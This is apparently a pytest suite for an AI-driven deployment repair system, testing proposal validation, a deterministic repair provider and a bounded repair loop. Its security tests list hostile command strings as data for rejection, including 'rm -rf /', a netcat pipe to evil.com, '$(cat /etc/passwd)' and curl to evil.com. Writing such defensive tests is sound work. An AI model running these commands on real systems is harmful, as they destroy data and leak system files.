"""
Phase 2.9 — AI Repair tests.

Tests the complete repair system:
- Repair types and proposals
- Deterministic validation
- Repair engine
- Repair loop
- Security regression
"""

import pytest
from unittest.mock import MagicMock, patch
from dataclasses import asdict

from app.repair.types import RepairType, RepairProposal, RepairContext, RepairResult
from app.repair.engine import RepairEngine
from app.repair.validator import validate_repair_proposal, ValidationResult, ALLOWED_FRAMEWORKS
from app.repair.deterministic import DeterministicRepairProvider, FRAMEWORK_AS_REPO
from app.repair.loop import RepairLoop, RepairLoopResult


# ============================================================================
# Fixtures
# ============================================================================


def _make_context(**kwargs) -> RepairContext:
    """Create a RepairContext with sensible defaults."""
    defaults = {
        "framework": "flask",
        "language": "python",
        "package_manager": "pip",
        "start_command": "python app.py",
        "health_check_path": "/health",
        "port": 5000,
        "install_command": "pip install -r requirements.txt",
        "build_command": None,
        "failure_stage": "build",
        "failure_error": "Build failed",
        "repository_url": "https://github.com/test/repo",
        "evidence_summary": ["Detected flask framework"],
        "file_names": ["app.py", "requirements.txt", "README.md"],
    }
    defaults.update(kwargs)
    return RepairContext(**defaults)


def _make_proposal(**kwargs) -> RepairProposal:
    """Create a RepairProposal with sensible defaults."""
    defaults = {
        "repair_type": RepairType.FRAMEWORK_DETECTION,
        "target": "framework",
        "original_value": "unknown",
        "proposed_value": "fastapi",
        "rationale": "Repository name matches framework",
        "evidence": ["Repo name: fastapi"],
        "confidence": "HIGH",
    }
    defaults.update(kwargs)
    return RepairProposal(**defaults)


# ============================================================================
# Repair Types Tests
# ============================================================================


class TestRepairTypes:
    """Test repair type definitions."""

    def test_repair_type_values(self):
        """All expected repair types exist."""
        assert RepairType.FRAMEWORK_DETECTION == "framework_detection"
        assert RepairType.START_COMMAND == "start_command"
        assert RepairType.HEALTH_CHECK_PATH == "health_check_path"
        assert RepairType.PACKAGE_MANAGER == "package_manager"
        assert RepairType.INSTALL_COMMAND == "install_command"
        assert RepairType.BUILD_COMMAND == "build_command"
        assert RepairType.PORT == "port"

    def test_repair_proposal_is_frozen(self):
        """RepairProposal must be immutable."""
        proposal = _make_proposal()
        with pytest.raises(AttributeError):
            proposal.target = "other"

    def test_repair_context_is_frozen(self):
        """RepairContext must be immutable."""
        ctx = _make_context()
        with pytest.raises(AttributeError):
            ctx.framework = "other"

    def test_repair_result_is_frozen(self):
        """RepairResult must be immutable."""
        result = RepairResult(
            attempt=0, proposal=None, accepted=False,
            applied=False, plan_repaired=None,
        )
        with pytest.raises(AttributeError):
            result.attempt = 1


# ============================================================================
# Deterministic Validation Tests
# ============================================================================


class TestRepairValidation:
    """Test deterministic validation of repair proposals."""

    def test_valid_proposal_accepted(self):
        """A valid proposal should pass validation."""
        proposal = _make_proposal()
        result = validate_repair_proposal(proposal)
        assert result.valid is True
        assert len(result.errors) == 0

    def test_invalid_repair_type_rejected(self):
        """Unknown repair type must be rejected."""
        proposal = _make_proposal()
        # Manually create with invalid type
        from app.repair.types import RepairType
        # Can't create invalid enum directly, so test via target mismatch
        proposal = _make_proposal(target="invalid_target")
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("not allowed" in e for e in result.errors)

    def test_target_mismatch_rejected(self):
        """Target must match repair type."""
        proposal = _make_proposal(
            repair_type=RepairType.FRAMEWORK_DETECTION,
            target="start_command",  # Wrong target for framework detection
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("not allowed" in e for e in result.errors)

    def test_command_injection_rejected(self):
        """Commands with shell metacharacters must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="python app.py; rm -rf /",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("metacharacters" in e for e in result.errors)

    def test_pipe_in_command_rejected(self):
        """Commands with pipes must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="python app.py | nc evil.com 4444",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_backtick_in_command_rejected(self):
        """Commands with backticks must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="`whoami`",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_dollar_paren_in_command_rejected(self):
        """Commands with $(...) must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="$(whoami)",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_empty_command_rejected(self):
        """Empty commands must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("empty" in e.lower() for e in result.errors)

    def test_null_byte_rejected(self):
        """Null bytes in commands must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="python app.py\x00evil",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_excessively_long_command_rejected(self):
        """Excessively long commands must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="python " + "a" * 3000,
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("length" in e.lower() for e in result.errors)

    def test_invalid_framework_rejected(self):
        """Unknown framework names must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.FRAMEWORK_DETECTION,
            target="framework",
            original_value="unknown",
            proposed_value="evil_framework",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("not a recognized" in e for e in result.errors)

    def test_valid_framework_accepted(self):
        """Known framework names must be accepted."""
        for fw in ["fastapi", "flask", "express", "react"]:
            proposal = _make_proposal(proposed_value=fw)
            result = validate_repair_proposal(proposal)
            assert result.valid is True, f"Framework '{fw}' should be valid"

    def test_invalid_port_rejected(self):
        """Non-numeric port must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.PORT,
            target="port",
            original_value="3000",
            proposed_value="abc",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_port_out_of_range_rejected(self):
        """Port outside 1-65535 must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.PORT,
            target="port",
            original_value="3000",
            proposed_value="99999",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_valid_port_accepted(self):
        """Valid port must be accepted."""
        proposal = _make_proposal(
            repair_type=RepairType.PORT,
            target="port",
            original_value="3000",
            proposed_value="8080",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is True

    def test_invalid_package_manager_rejected(self):
        """Unknown package manager must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.PACKAGE_MANAGER,
            target="package_manager",
            original_value="npm",
            proposed_value="evil_pm",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_valid_package_manager_accepted(self):
        """Known package managers must be accepted."""
        for pm in ["npm", "yarn", "pnpm", "pip", "pipenv", "poetry"]:
            proposal = _make_proposal(
                repair_type=RepairType.PACKAGE_MANAGER,
                target="package_manager",
                original_value="npm",
                proposed_value=pm,
            )
            result = validate_repair_proposal(proposal)
            assert result.valid is True, f"Package manager '{pm}' should be valid"

    def test_health_path_must_start_with_slash(self):
        """Health path must start with /."""
        proposal = _make_proposal(
            repair_type=RepairType.HEALTH_CHECK_PATH,
            target="health_check_path",
            original_value="/health",
            proposed_value="health",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False

    def test_valid_health_path_accepted(self):
        """Valid health paths must be accepted."""
        for path in ["/", "/health", "/healthz", "/api/health", "/ping"]:
            proposal = _make_proposal(
                repair_type=RepairType.HEALTH_CHECK_PATH,
                target="health_check_path",
                original_value="/health",
                proposed_value=path,
            )
            result = validate_repair_proposal(proposal)
            assert result.valid is True, f"Path '{path}' should be valid"

    def test_security_weakening_rejected(self):
        """Proposals that weaken security must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="python app.py",
            rationale="Disable security validation to make it work",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("weakening" in e.lower() for e in result.errors)

    def test_security_target_rejected(self):
        """Proposals targeting security settings must be rejected."""
        proposal = _make_proposal(
            repair_type=RepairType.START_COMMAND,
            target="privileged",  # Security target
            original_value="false",
            proposed_value="true",
        )
        result = validate_repair_proposal(proposal)
        assert result.valid is False
        assert any("security" in e.lower() for e in result.errors)

    def test_invalid_confidence_rejected(self):
        """Invalid confidence level must be rejected."""
        proposal = _make_proposal(confidence="EXTREME")
        result = validate_repair_proposal(proposal)
        assert result.valid is False


# ============================================================================
# Deterministic Repair Provider Tests
# ============================================================================


class TestDeterministicRepairProvider:
    """Test the deterministic repair provider."""

    def test_express_framework_as_repo(self):
        """Express repo should detect framework-as-repo."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            framework="unknown",
            repository_url="https://github.com/expressjs/express",
            file_names=["index.js", "lib/express.js", "package.json"],
        )
        proposal = provider.generate_repair(ctx, attempt=0)
        assert proposal is not None
        assert proposal.repair_type == RepairType.FRAMEWORK_DETECTION
        assert proposal.proposed_value == "express"
        assert proposal.confidence == "HIGH"

    def test_flask_framework_as_repo(self):
        """Flask repo should detect framework-as-repo."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            framework="unknown",
            repository_url="https://github.com/pallets/flask",
            file_names=["app.py", "flask/__init__.py", "requirements.txt"],
        )
        proposal = provider.generate_repair(ctx, attempt=0)
        # Flask repo name is 'flask', should match
        if proposal:
            assert proposal.repair_type == RepairType.FRAMEWORK_DETECTION
            assert proposal.proposed_value == "flask"

    def test_fastapi_framework_as_repo(self):
        """FastAPI repo should detect framework-as-repo."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            framework="unknown",
            repository_url="https://github.com/fastapi/fastapi",
            file_names=["main.py", "fastapi/__init__.py", "pyproject.toml"],
        )
        proposal = provider.generate_repair(ctx, attempt=0)
        if proposal:
            assert proposal.repair_type == RepairType.FRAMEWORK_DETECTION
            assert proposal.proposed_value == "fastapi"

    def test_already_correct_framework_no_repair(self):
        """If framework is already correct, no repair should be proposed."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            framework="express",
            repository_url="https://github.com/expressjs/express",
            file_names=["index.js", "package.json"],
        )
        proposal = provider.generate_repair(ctx, attempt=0)
        assert proposal is None

    def test_monorepo_nextjs_config(self):
        """Monorepo with next.config.js should detect Next.js."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            framework="react",
            file_names=["next.config.js", "package.json", "pages/index.js"],
            repository_url="https://github.com/test/monorepo-app",
        )
        proposal = provider.generate_repair(ctx, attempt=0)
        # Should detect nextjs from config file
        if proposal and proposal.repair_type == RepairType.FRAMEWORK_DETECTION:
            assert proposal.proposed_value == "nextjs"

    def test_false_positive_vite(self):
        """Vite detected as framework should be corrected to React."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            framework="vite",
            file_names=["vite.config.js", "App.jsx", "index.jsx", "package.json"],
            repository_url="https://github.com/test/vite-app",
        )
        proposal = provider.generate_repair(ctx, attempt=0)
        if proposal:
            assert proposal.repair_type == RepairType.FRAMEWORK_DETECTION
            assert proposal.proposed_value == "react"

    def test_health_path_fallback(self):
        """Health check failure should propose alternative paths."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            failure_stage="health_checking",
            failure_error="Health check failed: 404",
            health_check_path="/api/health",
        )
        proposal = provider.generate_repair(ctx, attempt=0)
        if proposal:
            assert proposal.repair_type == RepairType.HEALTH_CHECK_PATH
            assert proposal.proposed_value != "/api/health"

    def test_unsupported_failure_stage_no_repair(self):
        """Unsupported failure stage should return None."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(failure_stage="clone")
        proposal = provider.generate_repair(ctx, attempt=0)
        assert proposal is None

    def test_max_attempts_respected(self):
        """Should return None after max attempts."""
        provider = DeterministicRepairProvider()
        ctx = _make_context(
            failure_stage="health_checking",
            health_check_path="/health",
        )
        # Generate proposals until exhausted
        for i in range(10):
            proposal = provider.generate_repair(ctx, attempt=i)
            if proposal is None:
                break
        # After max_attempts, should always return None
        assert provider.generate_repair(ctx, attempt=100) is None

    def test_supported_failure_stages(self):
        """Should support build and health_checking stages."""
        provider = DeterministicRepairProvider()
        stages = provider.supported_failure_stages()
        assert "build" in stages
        assert "health_checking" in stages

    def test_max_attempts_returns_3(self):
        """Max attempts should be 3."""
        provider = DeterministicRepairProvider()
        assert provider.max_attempts() == 3


# ============================================================================
# Repair Engine Abstract Tests
# ============================================================================


class TestRepairEngine:
    """Test RepairEngine abstract interface."""

    def test_cannot_instantiate_abstract(self):
        """Cannot instantiate RepairEngine directly."""
        with pytest.raises(TypeError):
            RepairEngine()

    def test_deterministic_provider_is_concrete(self):
        """DeterministicRepairProvider can be instantiated."""
        provider = DeterministicRepairProvider()
        assert isinstance(provider, RepairEngine)


# ============================================================================
# Repair Loop Tests
# ============================================================================


class TestRepairLoop:
    """Test the bounded repair loop."""

    def test_unsupported_stage_returns_error(self):
        """Unsupported failure stage should return error result."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)
        ctx = _make_context(failure_stage="clone")
        result = loop.attempt_repair(ctx, attempt=0)
        assert result.applied is False
        assert result.error is not None
        assert "not supported" in result.error

    def test_max_attempts_exceeded(self):
        """Should reject attempts beyond max."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)
        ctx = _make_context(failure_stage="build")
        result = loop.attempt_repair(ctx, attempt=100)
        assert result.applied is False
        assert "exceeded" in result.error.lower()

    def test_valid_proposal_accepted(self):
        """Valid proposal should be accepted."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)
        ctx = _make_context(
            framework="unknown",
            repository_url="https://github.com/expressjs/express",
            file_names=["index.js", "package.json"],
            failure_stage="build",
        )
        result = loop.attempt_repair(ctx, attempt=0)
        if result.proposal:
            assert result.accepted is True

    def test_no_proposal_returns_error(self):
        """When engine returns None, loop returns error."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)
        ctx = _make_context(failure_stage="build", framework="flask")
        # This context may not generate a proposal
        result = loop.attempt_repair(ctx, attempt=0)
        # Either proposal or error
        assert result.proposal is not None or result.error is not None

    def test_can_repair(self):
        """can_repair should reflect engine support."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)
        assert loop.can_repair("build") is True
        assert loop.can_repair("health_checking") is True
        assert loop.can_repair("clone") is False

    def test_max_attempts_method(self):
        """max_attempts should delegate to engine."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)
        assert loop.max_attempts() == 3

    def test_engine_exception_handled(self):
        """Engine exceptions should be caught and returned as errors."""
        mock_engine = MagicMock(spec=RepairEngine)
        mock_engine.supported_failure_stages.return_value = {"build"}
        mock_engine.max_attempts.return_value = 3
        mock_engine.generate_repair.side_effect = RuntimeError("Engine crashed")

        loop = RepairLoop(mock_engine)
        ctx = _make_context(failure_stage="build")
        result = loop.attempt_repair(ctx, attempt=0)
        assert result.applied is False
        assert "error" in result.error.lower()


# ============================================================================
# Security Regression Tests
# ============================================================================


class TestRepairSecurity:
    """Verify Phase 2.7 security controls remain intact."""

    def test_no_command_injection_through_proposal(self):
        """Command injection via proposal must be blocked."""
        injections = [
            "python app.py; rm -rf /",
            "python app.py | nc evil.com 4444",
            "`whoami`",
            "$(cat /etc/passwd)",
            "python app.py && curl evil.com",
            "python app.py\nevil command",
        ]
        for cmd in injections:
            proposal = _make_proposal(
                repair_type=RepairType.START_COMMAND,
                target="start_command",
                original_value="python app.py",
                proposed_value=cmd,
            )
            result = validate_repair_proposal(proposal)
            assert result.valid is False, f"Injection not blocked: {cmd!r}"

    def test_no_url_injection_through_framework(self):
        """URL injection via framework name must be blocked."""
        injections = [
            "http://evil.com",
            "fastapi; rm -rf /",
            "../etc/passwd",
        ]
        for fw in injections:
            proposal = _make_proposal(
                repair_type=RepairType.FRAMEWORK_DETECTION,
                target="framework",
                proposed_value=fw,
            )
            result = validate_repair_proposal(proposal)
            assert result.valid is False, f"URL injection not blocked: {fw!r}"

    def test_no_security_policy_modification(self):
        """Attempts to modify security policy must be blocked."""
        security_targets = [
            "privileged", "cap_add", "cap_drop", "network_mode",
            "pid_mode", "user", "security_opt", "volumes",
            "docker_socket", "host_network", "host_pid",
        ]
        for target in security_targets:
            proposal = _make_proposal(
                repair_type=RepairType.START_COMMAND,
                target=target,
                proposed_value="evil",
            )
            result = validate_repair_proposal(proposal)
            assert result.valid is False, f"Security target '{target}' not blocked"

    def test_proposal_is_immutable(self):
        """Repair proposals must be immutable."""
        proposal = _make_proposal()
        with pytest.raises(AttributeError):
            proposal.proposed_value = "evil"

    def test_no_bypass_language(self):
        """Proposals with bypass language must be rejected."""
        bypass_words = ["disable", "bypass", "skip", "ignore", "unsafe", "nosec"]
        for word in bypass_words:
            proposal = _make_proposal(
                repair_type=RepairType.START_COMMAND,
                target="start_command",
                original_value="python app.py",
                proposed_value="python app.py",
                rationale=f"Need to {word} validation",
            )
            result = validate_repair_proposal(proposal)
            assert result.valid is False, f"Bypass word '{word}' not blocked"


# ============================================================================
# Integration: RepairProvider + Validator + Loop
# ============================================================================


class TestRepairIntegration:
    """Integration tests combining provider, validator, and loop."""

    def test_full_repair_cycle_framework_as_repo(self):
        """Full cycle: context → provider → validator → loop result."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)

        ctx = _make_context(
            framework="unknown",
            repository_url="https://github.com/expressjs/express",
            file_names=["index.js", "lib/express.js", "package.json"],
            failure_stage="build",
        )

        result = loop.attempt_repair(ctx, attempt=0)

        if result.proposal:
            assert result.accepted is True
            assert result.proposal.repair_type == RepairType.FRAMEWORK_DETECTION
            assert result.proposal.proposed_value == "express"
            assert result.proposal.confidence == "HIGH"

    def test_full_repair_cycle_health_fallback(self):
        """Full cycle for health check path fallback."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)

        ctx = _make_context(
            failure_stage="health_checking",
            failure_error="Connection refused",
            health_check_path="/api/health",
        )

        result = loop.attempt_repair(ctx, attempt=0)

        if result.proposal:
            assert result.accepted is True
            assert result.proposal.repair_type == RepairType.HEALTH_CHECK_PATH
            assert result.proposal.proposed_value != "/api/health"

    def test_multiple_attempts_exhaustion(self):
        """Multiple attempts should eventually exhaust."""
        provider = DeterministicRepairProvider()
        loop = RepairLoop(provider)

        ctx = _make_context(
            failure_stage="health_checking",
            health_check_path="/health",
        )

        results = []
        for i in range(5):
            result = loop.attempt_repair(ctx, attempt=i)
            results.append(result)
            if result.error and "exceeded" in result.error.lower():
                break

        # Should have at least one "exceeded" error
        assert any(
            r.error and "exceeded" in r.error.lower()
            for r in results
        )


class TestOrchestratorRepairIntegration:
    """Tests for RepairLoop integration in DeploymentOrchestrator."""

    def _make_plan(self, framework="node", language="javascript",
                   package_manager="npm", start_command="npm start",
                   port=3000, health_check_path="/", install_command="npm install",
                   build_command="npm run build"):
        """Helper to create an ExecutionPlan with correct types."""
        from app.analyzer.types import (
            ApplicationInfo, BuildInfo, RuntimeInfo, RepositoryInfo,
            CompatibilityResult, ExecutionPlan, DetectedSignal,
        )
        return ExecutionPlan(
            repository=RepositoryInfo(
                url="https://github.com/test/repo",
                owner="test", repo="repo",
                commit_sha="abc123",
            ),
            application=ApplicationInfo(
                language=language, framework=framework,
                framework_version=None, confidence="HIGH",
            ),
            build=BuildInfo(
                package_manager=package_manager,
                install_command=install_command,
                build_command=build_command,
                working_directory=".",
            ),
            runtime=RuntimeInfo(
                start_command=start_command,
                port=port,
                host="0.0.0.0",
                health_check_path=health_check_path,
            ),
            compatibility=CompatibilityResult(
                status="SUPPORTED", confidence="HIGH",
            ),
            evidence=[DetectedSignal(
                field="config_file", value="package.json",
                confidence="HIGH", evidence=["package.json exists"],
            )],
            created_at="2026-01-01T00:00:00Z",
        )

    def test_build_repair_context_from_plan(self):
        """_build_repair_context creates bounded context from ExecutionPlan."""
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        plan = self._make_plan()
        orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
        ctx = orch._build_repair_context(
            execution_plan=plan,
            failure_stage="build",
            failure_error="npm install failed",
            file_names=["package.json", "index.js"],
        )
        assert ctx.framework == "node"
        assert ctx.language == "javascript"
        assert ctx.failure_stage == "build"
        assert ctx.failure_error == "npm install failed"
        assert ctx.file_names == ["package.json", "index.js"]
        assert ctx.repository_url == "https://github.com/test/repo"

    def test_build_repair_context_truncates_error(self):
        """_build_repair_context truncates long error messages to 500 chars."""
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        plan = self._make_plan()
        orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
        ctx = orch._build_repair_context(
            execution_plan=plan,
            failure_stage="build",
            failure_error="x" * 1000,
            file_names=[],
        )
        assert len(ctx.failure_error) == 500

    def test_apply_repair_proposal_framework(self):
        """_apply_repair_proposal creates new plan with repaired framework."""
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        from app.repair.types import RepairProposal, RepairType
        plan = self._make_plan()
        proposal = RepairProposal(
            repair_type=RepairType.FRAMEWORK_DETECTION,
            target="framework",
            original_value="node",
            proposed_value="express",
            confidence="HIGH",
            rationale="package.json has express dependency",
        )
        orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
        repaired = orch._apply_repair_proposal(plan, proposal)
        assert repaired.application.framework == "express"
        assert repaired.runtime.start_command == plan.runtime.start_command
        assert repaired.build.package_manager == plan.build.package_manager

    def test_apply_repair_proposal_start_command(self):
        """_apply_repair_proposal creates new plan with repaired start command."""
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        from app.repair.types import RepairProposal, RepairType
        plan = self._make_plan(
            framework="flask", language="python",
            package_manager="pip", start_command="python app.py",
            port=5000, health_check_path="/api/health",
            install_command="pip install",
        )
        proposal = RepairProposal(
            repair_type=RepairType.START_COMMAND,
            target="start_command",
            original_value="python app.py",
            proposed_value="flask run --host 0.0.0.0 --port $PORT",
            confidence="HIGH",
            rationale="Standard Flask start command",
        )
        orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
        repaired = orch._apply_repair_proposal(plan, proposal)
        assert repaired.runtime.start_command == "flask run --host 0.0.0.0 --port $PORT"
        assert repaired.runtime.port == 5000
        assert repaired.runtime.health_check_path == "/api/health"

    def test_apply_repair_proposal_returns_original_on_validation_failure(self):
        """_apply_repair_proposal returns original plan if repaired plan is invalid."""
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        from app.repair.types import RepairProposal, RepairType
        plan = self._make_plan(
            framework="flask", language="python",
            package_manager="pip", start_command="python app.py",
            port=5000, health_check_path="/",
            install_command="pip install",
        )
        proposal = RepairProposal(
            repair_type=RepairType.PORT,
            target="port",
            original_value="5000",
            proposed_value="0",
            confidence="HIGH",
            rationale="Invalid port",
        )
        orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
        result = orch._apply_repair_proposal(plan, proposal)
        assert result.runtime.port == 5000

    def test_deploy_repair_fields_populated_on_success(self):
        """Successful deployment has repair fields at defaults."""
        import asyncio
        from unittest.mock import AsyncMock, MagicMock, patch
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        from app.orchestrator.states import DeploymentState

        async def run():
            orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
            orch.fetcher = AsyncMock()
            orch.cleanup = AsyncMock()
            orch.build_executor = AsyncMock()
            orch.runtime_executor = AsyncMock()
            orch.health_checker = AsyncMock()

            snapshot = MagicMock()
            snapshot.local_path = "/tmp/repo"
            snapshot.commit_sha = "abc123"
            snapshot.owner = "test"
            snapshot.repository = "repo"
            orch.fetcher.create_snapshot = AsyncMock(return_value=snapshot)

            plan = self._make_plan()

            with patch('app.orchestrator.orchestrator.analyze_repository', return_value=plan):
                with patch('app.analyzer.file_inventory.scan_repository') as mock_scan:
                    mock_inv = MagicMock()
                    mock_inv.files = ["package.json", "index.js"]
                    mock_scan.return_value = mock_inv

                    build_result = MagicMock()
                    build_result.success = True
                    build_result.container_id = "build-123"
                    orch.build_executor.execute_build = AsyncMock(return_value=build_result)

                    runtime_instance = MagicMock()
                    runtime_instance.container_id = "app-123"
                    runtime_instance.internal_url = "http://localhost:3000"
                    orch.runtime_executor.start_runtime = AsyncMock(return_value=runtime_instance)

                    health = MagicMock()
                    health.status = "healthy"
                    health.response_time_ms = 50
                    orch.health_checker.check_health = AsyncMock(return_value=health)

                    result = await orch.deploy(
                        deployment_id="test-deploy",
                        repository_url="https://github.com/test/repo",
                    )

                    assert result.state == DeploymentState.RUNNING
                    assert result.repair_attempted is False
                    assert result.repair_attempts == 0
                    assert result.repair_final_result is None

        asyncio.run(run())

    def test_deploy_triggers_repair_on_build_failure(self):
        """Build failure triggers repair attempt when possible."""
        import asyncio
        from unittest.mock import AsyncMock, MagicMock, patch
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        from app.orchestrator.states import DeploymentState
        from app.repair.types import RepairResult, RepairProposal, RepairType

        async def run():
            orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
            orch.fetcher = AsyncMock()
            orch.cleanup = AsyncMock()
            orch.build_executor = AsyncMock()
            orch.runtime_executor = AsyncMock()
            orch.health_checker = AsyncMock()

            snapshot = MagicMock()
            snapshot.local_path = "/tmp/repo"
            snapshot.commit_sha = "abc123"
            snapshot.owner = "test"
            snapshot.repository = "repo"
            orch.fetcher.create_snapshot = AsyncMock(return_value=snapshot)

            plan = self._make_plan()

            with patch('app.orchestrator.orchestrator.analyze_repository', return_value=plan):
                with patch('app.analyzer.file_inventory.scan_repository') as mock_scan:
                    mock_inv = MagicMock()
                    mock_inv.files = ["package.json"]
                    mock_scan.return_value = mock_inv

                    failed_build = MagicMock()
                    failed_build.success = False
                    failed_build.error = "npm ERR! code ERESOLVE"

                    proposal = RepairProposal(
                        repair_type=RepairType.START_COMMAND,
                        target="start_command",
                        original_value="npm start",
                        proposed_value="node server.js",
                        confidence="HIGH",
                        rationale="Standard Node.js start",
                    )
                    repair_result = RepairResult(
                        attempt=0,
                        accepted=True,
                        applied=False,
                        proposal=proposal,
                        plan_repaired=None,
                    )

                    orch.repair_loop = MagicMock()
                    orch.repair_loop.can_repair.return_value = True
                    orch.repair_loop.attempt_repair.return_value = repair_result
                    orch.repair_loop.max_attempts.return_value = 3

                    success_build = MagicMock()
                    success_build.success = True
                    success_build.container_id = "build-456"

                    runtime_inst = MagicMock()
                    runtime_inst.container_id = "app-456"
                    runtime_inst.internal_url = "http://localhost:3000"

                    health = MagicMock()
                    health.status = "healthy"
                    health.response_time_ms = 40

                    orch.build_executor.execute_build = AsyncMock(
                        side_effect=[failed_build, success_build]
                    )
                    orch.runtime_executor.start_runtime = AsyncMock(return_value=runtime_inst)
                    orch.health_checker.check_health = AsyncMock(return_value=health)

                    result = await orch.deploy(
                        deployment_id="test-repair",
                        repository_url="https://github.com/test/repo",
                    )

                    assert result.state == DeploymentState.RUNNING
                    assert result.repair_attempted is True
                    assert result.repair_attempts == 1
                    assert result.repair_proposal_type == "start_command"
                    assert result.repair_final_result is None

        asyncio.run(run())

    def test_deploy_unsupported_failure_skips_repair(self):
        """Unsupported failure stage skips repair."""
        import asyncio
        from unittest.mock import AsyncMock, MagicMock, patch
        from app.orchestrator.orchestrator import DeploymentOrchestrator
        from app.orchestrator.states import DeploymentState

        async def run():
            orch = DeploymentOrchestrator.__new__(DeploymentOrchestrator)
            orch.fetcher = AsyncMock()
            orch.cleanup = AsyncMock()
            orch.build_executor = AsyncMock()
            orch.runtime_executor = AsyncMock()
            orch.health_checker = AsyncMock()

            snapshot = MagicMock()
            snapshot.local_path = "/tmp/repo"
            snapshot.commit_sha = "abc123"
            snapshot.owner = "test"
            snapshot.repository = "repo"
            orch.fetcher.create_snapshot = AsyncMock(return_value=snapshot)

            plan = self._make_plan(
                framework="flask", language="python",
                package_manager="pip", start_command="python app.py",
                port=5000, health_check_path="/",
                install_command="pip install",
            )

            with patch('app.orchestrator.orchestrator.analyze_repository', return_value=plan):
                with patch('app.analyzer.file_inventory.scan_repository') as mock_scan:
                    mock_inv = MagicMock()
                    mock_inv.files = ["app.py"]
                    mock_scan.return_value = mock_inv

                    failed_build = MagicMock()
                    failed_build.success = False
                    failed_build.error = "Segmentation fault"

                    orch.repair_loop = MagicMock()
                    orch.repair_loop.can_repair.return_value = False

                    orch.build_executor.execute_build = AsyncMock(return_value=failed_build)

                    result = await orch.deploy(
                        deployment_id="test-no-repair",
                        repository_url="https://github.com/test/repo",
                    )

                    assert result.state == DeploymentState.BUILD_FAILED
                    assert result.repair_attempted is False
                    assert result.repair_final_result == "unsupported"

        asyncio.run(run())

